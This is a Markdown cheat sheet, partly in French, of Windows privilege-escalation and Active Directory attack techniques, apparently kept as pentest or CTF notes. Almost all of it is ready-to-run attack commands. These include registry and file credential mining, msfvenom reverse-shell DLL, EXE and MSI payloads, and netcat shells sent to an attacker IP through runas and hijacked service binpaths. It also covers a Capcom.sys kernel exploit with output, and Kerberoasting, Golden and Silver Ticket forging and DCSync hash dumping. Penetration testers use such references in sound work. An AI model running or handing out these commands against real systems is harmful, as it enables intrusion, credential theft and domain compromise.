# Windows - Privilege Escalation

### Table of contents

- [Windows - Privilege Escalation](#windows---privilege-escalation)
    - [Check CVE](#check-cve)
        - [Vulnerable Kernel ?](#vulnerable-kernel-)
        - [Vulnerable Driver ?](#vulnerable-driver-)
        - [Vulnerable Software ?](#vulnerable-software-)
    - [Passwords Mining](#passwords-mining)
        - [Memory](#memory)
        - [Registry](#registry)
        - [Misc](#misc)
        - [TODO](#todo)
    - [Runas (saved credentials)](#runas-saved-credentials)
    - [Group privilege](#Groups-Privileges)
    - [User Privileges](#user-privileges)
        - [Exploitable privileges](#exploitable-privileges)
    - [Scheduled Tasks](#scheduled-tasks)
        - [Missing Binary](#missing-binary)
    - [Startup Applications](#startup-applications)
    - [Registry](#registry-1)
        - [AlwaysInstallElevated](#alwaysinstallelevated)
    - [Services](#services)
        - [Usefull services commands](#usefull-services-commands)
        - [BinPath Edit](#binpath-edit)
        - [Bin Edit](#bin-edit)
        - [Unquoted Path](#unquoted-path)
    - [DLL Hijacking](#dll-hijacking)
    - [Logging/AV enumeration](#loggingav-enumeration)
    - [Network](#network)
        - [TODO](#todo-1)
    - [Windows Internals](#windows-internals)
        - [Is WSUS (Windows Server Update Services) vulnerable ?](#is-wsus-(windows-server-update-services)-vulnerable-)
        - [Windows Subsystem for Linux (WSL)](#windows-subsystem-for-linux-wsl)
        - [UAC Buypass](#uac-buypass)
        - [AV Buypass](#av-buypass)
        - [Interesting Files](#interesting-files)
            - [.VHD](#vhd)
            - [OST / PST ( Microsoft Outlook email folder)](#ost--pst--microsoft-outlook-email-folder)
        - [Named Pipes](#named-pipes)
    - [Protocols](#protocols)
        - [SMB](#smb)
        - [LDAP](#ldap)
        - [Win-RM](#win-rm)
        - [Win RPC](#win-rpc)
    - [Active Directory](#active-directory)
        - [Kerberos](#kerberos)
        - [Kerberoasting](#kerberoasting)
        - [Silver Ticket](#silver-ticket)
        - [Golden Ticket](#golden-ticket)
        - [ASREPRoast (get user cred)](#asreproast-get-user-cred)
        - [DCSync Attack (LPE AD)](#dcsync-attack-lpe-ad)
        - [Unconstrained Delegation](#unconstrained-delegation)
    - [Tools](#tools)
    - [Sources](#sources)



## Check CVE

### Vulnerable Kernel ?

The following command can be used to retrieve installed patches and their date:
```
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

Search for kernel exploits using scripts:
* [wesng](https://github.com/bitsadmin/wesng)
* [Watson](https://github.com/rasta-mouse/Watson)
* [Sherlock](https://github.com/rasta-mouse/Sherlock)
```
Import-Module ./sherlock.ps1
Find-AllVulns
```
* searchsploit
* post/windows/gather/enum_patches
* post/multi/recon/local_exploit_suggester

### Vulnerable Driver ?
```
driverquery /fo table
```

### Vulnerable Software ?
List installed Software:
```powershell
wmic product get name, version

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
or
```
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize
```

## Passwords Mining

### Memory
TODO ( mimikatz)

**secretdump.py**

```bash
secretdump.py "DOMAIN/user[:password]@IP" [-hashes LM:NT]
secretdump.py [-ntds] [-system] [-security] [-bootkey]
#exemple
secretdump.py "MY_DOMAIN/jack:B3stP4ssw0rd@10.10.10.10"
secretdump.py "My_DOMAIN/jacky@10.10.10.10" -hashes :aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
secretdump.py -ntds ntds.dit -system system LOCAL #<= local because you upload the ntds and system from the target to your pc to compute locally
```



### Registry
#### Check stored passwords for AutoLogon
```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUsername
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```

#### Search the registry for key names and passwords

```powershell
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K

reg query HKLM /f password /t REG_SZ /s
reg query HKLM /f passwd /t REG_SZ /s
reg query HKU /f password /t REG_SZ /s
reg query HKU /f passwd /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query HKCU /f passwd /t REG_SZ /s

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

### Misc
#### What is inside the Clipboard?
```
powershell -command "Get-Clipboard"
```

#### Check for credentials in environment variables:
```
set
```

#### Powershell history

```powershell
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
#### Wifi passwords

Find AP SSID
```bat
netsh wlan show profile
```

Get Cleartext Pass
```bat
netsh wlan show profile <SSID> key=clear
```

Oneliner method to extract wifi passwords from all the access point.

```batch
cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
```

#### Passwords stored in services

Saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using [SessionGopher](https://github.com/Arvanaghi/SessionGopher)


```powershell
https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

#### Passwords in unattend.xml

The unattend.xml file is used by system administrators to automate the Windows installation process with the  `Windows Deployment Services`

```powershell
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

Display the content of these files with `dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul`.

Example content:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

Unattend credentials are stored in base64 and can be decoded manually with base64.

```powershell
$ echo "U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo=" | base64 -d
SecretSecurePassword1234*
```

### TODO
* Groups.xml
* Windows Vault credentials that you could use?
* CMD History
* Interesting DPAPI credentials?
* SSH keys in registry?
* Credentials inside "known files"? Inside the Recycle Bin? In home?
* Inside Browser data (dbs, history, bookmarks....)?
* AppCmd.exe exists? Credentials?
* SCClient.exe? DLL Side Loading?
* Cloud credentials?


## Runas (saved credentials)

Use the `cmdkey` to list the stored credentials on the machine.

```powershell
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Then you can use `runas` with the `/savecred` options in order to use the saved credentials.
The following example is calling a remote binary via an SMB share.
```powershell
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Using `runas` with a provided set of credential.

```powershell
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

```powershell
$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
$computer = "<hostname>"
[System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
```

## Groups Privileges

DNS Admin
```
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f dll > privesc.dll
dnscmd 127.0.0.1 /config /serverlevelplugindll privesc.dll
sc.exe stop dns
sc.exe start dns
```

[Backup operator](#Exploitable-privileges)



## User Privileges

Check current user privileges
```
whoami /priv
```

Change privileges (Administrator)
```
"%windir%\system32\secpol.msc /s"
```

lister les users avec le priv <PRIV> (Administrator)
```
wget https://gallery.technet.microsoft.com/scriptcenter/Grant-Revoke-Query-user-26e259b0/file/198800/1/UserRights.psm1
Import-Module .\UserRights.psm1
Get-AccountsWithUserRight -Right SeServiceLogonRight

ou

accesschk.exe /accepteula -q -a SeServiceLogonRight
```

[Default Privileges for Groups](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-groupstable)

[Privileges List](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/user-rights-assignment)


### Exploitable privileges
* [Slide Infos](https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf)
* [ExploitDb Infos](https://www.exploit-db.com/papers/42556)


**SeImpersonatePrivilege or SeAssignPrimaryPrivilege**

With `SeImpersonatePrivilege` or `SeAssignPrimaryPrivilege` you can be SYSTEM using [Juicy Potato](https://github.com/ohpe/juicy-potato)


**SeTcbPrivilege**

TODO


**SeCreateTokenPrivilege**

TODO

**SeTakeOwnershipPrivilege**

TODO


**SeDebugPrivilege**

TODO


**SeRestorePrivilege**

TODO


**SeLoadDriverPrivilege**

If we have SetLoadDriverPervilege enabled we can be Administrator by using the `Capcom.sys` driver to execute some kernel command

First : <https://github.com/TarlogicSecurity/EoPLoadDriver/><br>
compile this on your windows machine and import on the box
```
./yolo.exe System\CurrentControlSet\Yolo c:\temp\Capcom.sys
[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet\Yolo
NTSTATUS: 00000000, WinError: 0
```
Look at the end of the ouput we need to have this `NSTATUS; 00000000`

Then use : <https://github.com/tandasat/ExploitCapcom><br>
Change the command on exploitcapcom.cpp and put your exec cpp name run your listener and exec the ExploitCapcom.exe:
```
PS C:\temp> ./exp.exe
./exp.exe
[*] Capcom.sys exploit
[*] Capcom.sys handle was obtained as 0000000000000064
[*] Shellcode was placed at 0000017CD8FD0008
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched
[*] Press any key to exit this program
```
Got your reverse shell as Administrator


**SeBackupPrivilege**

If you are in Backup_Operator group, you should have *SeBackupPrivilege* enable. If it doesn't you can still enable it by following this procedure :

<https://github.com/giuliano108/SeBackupPrivilege>

Download 2 Dlls from the previous github, upload on the machine, and Import-Module for both dll. then

```powershell
#Import-Module ./dll1
#Import-Module ./dll2
Set-SeBackupPrivilege
```

Once done, You could use `diskshadow` to backup the C: disk :

```powershell
#script.txt
set metadata C:\temp\metadata.cab
set context clientaccessible;
set context persistent;
begin backup;
add volume c: alias mydrive;
create;
expose %mydrive% z:;
```

```powershell
diskshadow /s script.txt #to backup the entire C: volume
Copy-FileSeBackupPrivilege z:\windows\NTDS\ntds.dit c:\temp\ntds.dit # get ntdis from the backup
reg save HKLM\SYSTEM c:\system #get system from the hive
```

Now we can extract these ntds.dit and system with secretdump to get Administrator hash

```bash
secretdump.py -ntds ntds.dit -system system LOCAL
```



## Processes

What processes are running?

```powershell
tasklist /v
net start
sc query
Get-Service
Get-Process
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
```

Which processes are running as "system"

```powershell
tasklist /v /fi "username eq system"
```

## Scheduled Tasks
List Scheduled Tasks
```powershell
schtasks /query
or (more details)
schtasks /query /v /fo list

schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```
### Missing Binary
Use autoruns64.exe on 'Scheduled Tasks' tab to find if some Scheduled Binary are missing.
In that case check write permissions and try to replace that binary.

## Startup Applications
```powershell
wmic startup get caption,command
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

Check permissions
```
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```
If write access -> place `.exe` reverse shell, it will be executed by the Administrator after his login

## Registry

### AlwaysInstallElevated
If this setting is enabled it allows users of any privilege level to install `*.msi` files as `NT AUTHORITY\SYSTEM`

Check if enabled:
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
To exploit create an .msi backdoor and install it:
``` powershell
$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
$ msiexec /quiet /qn /i <PATH TO MSI BACKDOOR>
```

## Services

* Can you modify any service?
* Can you modify the binary that is executed by any service?
* Can you modify the registry of any service?
* Can you take advantage of some unquoted service binary path?

For each service, a registry key exists in `HKLM\SYSTEM\CurrentControlSet\Services`. The subkeys of a service’s key contain information regarding the executable file path, parameters and configuration options.

### Usefull services commands

#### Powershell
List services
```
Get-Service <Nom du service>
Get-Service * | sort DisplayName
Get-WmiObject win32_service | select Name, DisplayName, State, PathName
wmic service list brief
```
Manage service
```
Restart-Service UsoSvc
Start-Service UsoSvc
Stop-Service UsoSvc
```

#### CMD
List services
```
sc queryex type=service state=all | find /i "service name"
net start
wmic service list brief
tasklist /SVC
```

Service details
```
sc query <service name>
```

Manage service
```
net stop/start [service name]
sc stop/start [service name]
```

#### GUI
run `services.msc`

### BinPath Edit

Weak service permissions can be used to modify the binary path in a service and hereby executy arbitrary files.

#### Detection
`accesschk64.exe -wuvc <service>`

if `"SERVICE_CHANGE_CONFIG"` permission enabled -> vulnerable ! we can change the service binary path to exec a custom command



#### Exploit
PowerSploit:
```
Import-Module C:\Users\Public\p.ps1;
Invoke-AllChecks
Invoke-ServiceAbuse -ServiceName 'UsoSvc' -Command "C:\Users\Public\nc64.exe -e cmd.exe 10.10.14.139 1122" -Verbose
```

Manual:
```
sc.exe stop UsoSvc;
sc.exe config UsoSvc binpath= "C:\Users\Public\nc64.exe 10.10.14.151 4442 -e cmd.exe";
sc.exe qc UsoSvc;
sc.exe start UsoSvc;
```

### Bin Edit
Services execute the file defined in their file path. If this file can be modified by an attacker, he is able to replace it by a malicious file of his own.

Note to check file permissions you can use `cacls` and `icacls`

You are looking for `BUILTIN\Users:(F)`(Full access), `BUILTIN\Users:(M)`(Modify access) or  `BUILTIN\Users:(W)`(Write-only access) in the output.

Or you can use the PowerSploit’s `Get-ModifiableServiceFile` method to directly detect all vulnerables services.


### Configuration files
Services sometimes load configuration files. Depending on the program, it might be possible that such a configuration file can be used to execute an arbitrary file. If write permissions for such a configuration file exists, privileges can be escalated.

### Unquoted Path
All Windows services have a Path to its executable. If that path is unquoted and contains whitespace or other separators, then the service will attempt to access a resource in the parent path first.

<https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae>

For `C:\Program Files\something\legit.exe`, Windows will try the following paths first:
- `C:\Program.exe`
- `C:\Program Files.exe`

#### Detection:
```powershell
sc.exe qc <service>
```
if no quotes in "BINARY_PATH_NAME" -> vulnerable

Auto search:
```powershell
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

or

gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

#### Exploit:
```
msfvenom -p windows/shell/reverse_tcp LHOST=YourIP LPORT=YourPort -f exe > shell-cmd.exe
```


## DLL Hijacking
* Can you write in any folder inside PATH?
* Is there any known service binary that tries to load any non-existant DLL?
* Can you write in some binaries folder?

<https://pentestlab.blog/2017/03/27/dll-hijacking/>

When an application needs to load a DLL it will go through the following order:
* The directory from which the application is loaded
* `C:\Windows\System32`
* `C:\Windows\System`
* `C:\Windows`
* The current working directory
* Directories in the system PATH environment variable
* Directories in the user PATH environment variable

### Step 1 – Processes with Missing DLL’s
ProcessMonitor filters
```
Result is NAME NOT FOUND
User is SYSTEM
Path end with .dll
```
Or PowerSploit: `Find-ProcessDLLHijack`

### Step 2 – Folder Permissions
`icalcs <folder>`<br>
Or PowerSploit: `Find-PathDLLHijack`

### Step 3 – DLL Hijacking
```
msfvenom -p windows/shell/reverse_tcp LHOST=YourIP LPORT=YourPort -f dll > shell-cmd.dll
```
Or PowerSploit: `Write-HijackDll`<br>
Or compile DLL
```
x86_64-w64-mingw32-gcc windll.c -shared -o hijackme.dll
```
### Step 4 - Restart the service/process
cf Usefull CMD


## Logging/AV enumeration
* Check LAPS
* Check Audit and WEF settings
	Windows Event Forwarding, is interesting to know where are the logs sent
	```
	reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
	```
* Check if any AV
	```
	WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List | more
	```

## Network
### TODO
* Check current network information
* Check hidden local services restricted to the outside
* Is any unknown software running?
* Is any software with more privileges that it should have running?
* Search for exploits for running processes (specially if running of versions)
* Can you read some interesting process memory (where passwords could be saved)?
* Have write permissions over the binaries executed by the processes?
* Have write permissions over the folder of a binary being executed to perform a DLL Hijacking?
* What is running on startup of is scheduled? Can you modify the binary?
* Can you dump the memory of any process to extract passwords?
* Responder



## Windows Internals

### Is WSUS (Windows Server Update Services) vulnerable ?

You can compromise the system if the updates are not requested using httpS but http.

Check if HTTPS is used:
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

And check if WSUS is used:
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer
```
If it's equals to 1 then it's exploitable.

Use: [Wsuxploit](https://github.com/pimps/wsuxploit) - This is a MiTM weaponized exploit script to inject 'fake' updates into non-SSL WSUS traffic.

### Windows Subsystem for Linux (WSL)

Technique borrowed from [Warlockobama's tweet](https://twitter.com/Warlockobama/status/1067890915753132032)

> With root privileges Windows  Subsystem for Linux (WSL)  allows users to create a bind shell on any port (no elevation needed). Don't know the root password? No problem just set the default user to root W/ <distro>.exe --default-user root. Now start your bind shell or reverse.

```powershell
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Binary `bash.exe` can also be found in `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Alternatively you can explore the `WSL` filesystem in the folder `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

### UAC Buypass

### AV Buypass

- [GreatSCT](https://github.com/GreatSCT/GreatSCT) (gen metasploit payloads that bypass common anti-virus solutions and application whitelisting solutions)

  - ```bash
    git clone https://github.com/GreatSCT/GreatSCT
    cd Gre*
    cd setup
    ./setup.sh
    # y
    ```

### Interesting Files

#### .VHD

VHD (Virtual Hard Disk) is a file format representing a virtual hard disk drive (HDD). It may contain what is found on a physical HDD, such as disk partitions and a file system, which in turn can contain files and folders. It is typically used as the hard disk of a virtual machine.

List content: `7z l file.vhd`

Mount:

```bash
apt install libguestfs-tools
mkdir /mnt/vhd
guestmount --add <VHD FILE> --inspector --ro -v  /mnt/vhd
cd /mnt/vhd
```

#### OST / PST ( Microsoft Outlook email folder)

````bash
readpst username@domain.local.ost
less Drafts.mbox
evolution Drafts.mbox
````

### Named Pipes

1. Find named pipes: `[System.IO.Directory]::GetFiles("\\.\pipe\")`
2. Check named pipes DACL: `pipesec.exe <named_pipe>`
3. Reverse engineering software
4. Send data throught the named pipe : `program.exe >\\.\pipe\StdOutPipe 2>\\.\pipe\StdErrPipe`


## Protocols

### SMB

```bash
smbmap -H IP -u user -p password
smbmap -H IP -u "user%" #password empty

smbclient \\\\IP\\Share -U "user%password"
smbclient \\\\IP\\Share -U "user%user" # Not common
# to download all Share once connected
> mask ""
> recurse ON
> prompt OFF
> mget *
```

### LDAP

```bash
ldapsearch -x -h IP -s base
# result
#  ...
#  namingcontext DC=something,DC=someotherthing
ldapsearch -x -h IP -b "DC=something,DC=someotherthing"
# chech for password or something interesting in result
# ldap with bind
ldapsearch -x -h IP -D "cn=User,ou=server,dc=something,dc=someotherthing" -w Password
#-----------------------------------------------
ldapmodify -x -h IP -D "cn=User,ou=server,dc=something,dc=someotherthing" -w Password -f file.txt
# file.txt be like if you want add sshKey
dn: #of the user you want to modify
changeType: modify
add: objectClass
objectClass: ldapPublicKey
- # dash is usefull when you want more than 1 command
add: sshPublicKey
sshPublicKey: ssh-rsa yourkey
#-----------------------------------------------
```



### Win-RM

All user cannot use winrm, default only remote management's user can use winrm

```bash
evil-winrm -i IP -u User -p Password
evil-winrm -i IP -u User -H HASH_OF_USER
```



### Win RPC

```bash
rpcclient -U $ip # blank passwd
enumdomusers
queryusergroups $rid #rid is seen in the last cmd - tells the groups of the user
querygroup $rid #information about this group
queryuser $rid # info about the user
setuserinfo $username $level $password #change user info if enough right
# level :  according to this : https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN
```

## Active Directory

### Kerberos
Acteurs:
* KDC = Key Distribution Center (meme machine que le DC en env AD)
* Client
* Service

TGT = Ticket Granting Ticket

TGS = Ticket Granting Service

PAC = Privilege Attribute Certificate

secret du KDC = le mot de passe du compte `krbtgt`

1. Authentication Service (AS) : Le client doit s’authentifier auprès du KDC

`KRB_AS_REQ`

`KRB_AS_REP`

2. Ticket-Granting Service (TGS) : Il doit ensuite demander un ticket permettant d’accéder au service

`KRB_TGS_REQ`

`KRB_TGS_REP`

3. Accès au service (AP) : Il communique enfin avec le service en lui fournissant le ticket

`KRB_AP_REQ`

`KRB_AP_REP`

#### Usefull Kerberos commands :

List cached tickets:

```
klist
```



### Kerberoasting

The goal of Kerberoasting is to harvest TGS tickets for services that run on behalf of user accounts in the AD, not computer accounts. Thus, part of these TGS tickets are encrypted with keys derived from user passwords (weaker than the long randoms passwords used by computer accounts). As a consequence, their credentials could be cracked offline. To exploit we have to search for AD users having at least one SPN, ask TGS for theses accounts and extract the cyphered part (crackable with john).

Some scripts automate the process:

* Impacket [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py)
```
GetUserSPNs.py -request -dc-ip <IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast # Pass The Hash
```

* [Invoke-Kerberoast.ps1](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1)
```
Invoke-Kerberoast -domain adsec.local | Export-CSV -NoTypeInformation output.csv
john --session=Kerberoasting output.csv
```

### Silver Ticket
The Silver ticket attack is based on crafting a valid TGS for a service once the NTLM hash of service is owned (like the PC account hash). Thus, it is possible to gain access to that service by forging a custom TGS as any user.

```bash
# get domainSID
Get-ADDomain $domainName
```

* mimikatz

``` bash
# Forge
/kerberos::golden /domain:adsec.local /user:random_user /sid:S-1-5-21-1423455951-1752654185-1824483205 /rc4:ceaxxxxxxxxxxxxxxxxxxxxxxxxxxxxx /target:DESKTOP-01.adsec.local /service:cifs /ptt
# Inject in memory
mimikatz.exe "kerberos::ptt ticket.kirbi"
```

* impacket ticketer.py

``` bash
# forge
ticketer.py -nthash ceaxxxxxxxxxxxxxxxxxxxxxxxxxxxxx -domain-sid S-1-5-21-1423455951-1752654185-1824483205 -domain adsec.local -spn CIFS/DESKTOP-01.adsec.local random_user

# export
export KRB5CCNAME='/path/to/random_user.ccache'

# use the ticket with -k option
psexec.py -k DESKTOP-01.adsec.local
```

### Golden Ticket
We need the `krbtgt` user's NTML hash to forge custom TGT with arbitrary PAC.

Then we can forge a TGT placing the TGT's user in the Domain Administrator group, this TGT is named `Golden Ticket`.

```bash
# get domainSID
Get-ADDomain $domainName
```

* mimikatz

``` bash
# Forge
/kerberos::golden /domain:adsec.local /user:random_user /sid:S-1-5-21-1423455951-1752654185-1824483205 /krbtgt:ceaxxxxxxxxxxxxxxxxxxxxxxxxxxxxx /ptt
```

* impacket ticketer.py

``` bash
# forge
ticketer.py -nthash ceaxxxxxxxxxxxxxxxxxxxxxxxxxxxxx -domain-sid S-1-5-21-1423455951-1752654185-1824483205 -domain adsec.local random_user

# export
export KRB5CCNAME='/path/to/random_user.ccache'

# use the ticket with -k option
./psexec.py $domainName/randomuser@$IP -k -no-pass
secretsdump.py -k DC-01.adsec.local -just-dc-ntlm -just-dc-user krbtgt
```

If error due to time:

```bash
cat $iptarget.nmap # check clock-skew -> deviation
for i in $(seq 00 24); do date -s $i:36:00; ./psexec.py $domainName/TotallyDoesNotExist@$IP -k -no-pass; done
#check the date for the one which a different message (  SErver not found ?)
date -s $datefound
./psexec.py $domainName/TotallyDoesNotExist@$IP -k -no-pass
# psexec on the impacket version is always going to be system user
./wmiexec.py $domainName/TotallyDoesNotExist@$IP -k -no-pass
```
### ASREPRoast (get user cred)

If Kerberos Preauth is diabled we can ask a TGT (Ticket Granting Service) to KDC (Key Distribution Center) for every user.

```
#Try all the usernames in usernames.txt
GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile usernames.txt -dc-ip <IP> -format john
GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile usernames.txt -dc-ip <IP> -format hashcat

#Use domain creds to extract targets and target them
GetNPUsers.py <domain>/<user>:<pass> -request -format john -outputfile hashes.asreproast
```
We can also use Rubeus (Rubeus -> asreproast action)

[Hackndo infos](https://beta.hackndo.com/kerberos-asrep-roasting/)

### DCSync Attack (LPE AD)
If our user had the following permissions on the domain:
```
Replicating Directory Change
Replicating Directory Change ALL
```

We can ask sensitives infos of all users (ex: NTLM Hash of the Administrator)
#### On the machine with mimikatz
```
.\mimikatz
lsadump::dcsync /EGOTISTICAL-BANK.LOCAL:SAUNA.EGOTISTICAL-BANK.LOCAL /user:<TARGET USER>
```

#### Remotely with secretsdump.py (Impacket)
```
secretsdump.py -dc-ip 10.10.10.30 EGOTISTICAL-BANK.LOCAL/svc_bes:Sheffield19@10.10.10.30
```

#### Check users who has these permissions
```
Get-ObjectAcl -DistinguishedName "dc=<DOMAIN>,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')}
```

[more here](https://attack.stealthbits.com/privilege-escalation-using-mimikatz-dcsync)


### Unconstrained Delegation

Il existe un drapeau qui peut être placé sur un service indiquant qu’il peut impersonner un utilisateur. Cela veut dire que si un utilisateur s’authentifie auprès de ce service, ce dernier est en mesure de s’authentifier auprès d’un (ou plusieurs) autre(s) service(s) en se faisant passer pour l’utilisateur.

Deux drapeaux existent :

* `Constrained Delegation` : Une liste de services auprès desquels le premier service peut s’authentifier est décidée par l’administrateur.
* `Unconstrained Delegation` : Ce drapeau indique que le service peut se faire passer pour l’utilisateur lorsqu’il s’authentifie auprès de n’importe quel autre service.

Si un attaquant arrive à prendre le contrôle d’une machine sur laquelle tourne un service en `Unconstrained Delegation`, alors il suffit qu’il force un compte à s’authentifier sur ce service pour récupérer le TGT de l’utilisateur et la clé de session. Pour peu que ce soit un administrateur du domaine qui est impersonné, l’attaquant pourra alors effectuer n’importe quelle action de la part de l’utilisateur sur le domaine.



## Tools

* [BloodHound](https://github.com/BloodHoundAD/BloodHound/)
* [PEASS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
* [evil-winrm](https://github.com/Hackplayers/evil-winrm)
* [JAWS](https://github.com/411Hall/JAWS)
* mRemoteNG-Decrypt
* python-impacket
* [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
* smbclient
* smbmap
* Crackmapexec
* rpcclient
* psexec
* secretdump.py
* watson
* ldapsearch
* gpp-decrypt
* [nishang](https://github.com/samratashok/nishang)
- [python-impacket](https://github.com/SecureAuthCorp/impacket)
- [mRemoteNG-Decrypt](https://github.com/haseebT/mRemoteNG-Decrypt)
* [BeRoot](https://github.com/AlessandroZ/BeRoot)
